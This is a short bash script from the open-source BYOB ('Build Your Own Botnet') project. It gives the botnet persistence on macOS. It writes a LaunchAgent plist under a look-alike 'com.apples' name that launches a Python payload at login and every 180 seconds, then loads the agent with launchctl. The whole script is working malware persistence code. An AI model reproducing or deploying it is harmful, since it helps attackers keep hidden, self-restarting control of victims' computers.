#!/bin/bash
#
# BYOB (Build Your Own Botnet)
# https://github.com/colental/byob
# Copyright (c) 2018 Daniel Vega-Myhre

echo '<plist version="1.0">

<dict>

<key>Label</key>

<string>__LABEL__</string>

<key>ProgramArguments</key>

<array>

<string>/usr/bin/python</string>

<string>__FILE__</string>

</array>

<key>RunAtLoad</key>

<true/>

<key>StartInterval</key>

<integer>180</integer>

<key>AbandonProcessGroup</key>

<true/>

</dict>

</plist>' > ~/Library/LaunchAgents/com.apples.__LABEL__.plist

chmod 600 ~/Library/LaunchAgents/com.apples.__LABEL__.plist

launchctl load ~/Library/LaunchAgents/com.apples.__LABEL__.plist

exit
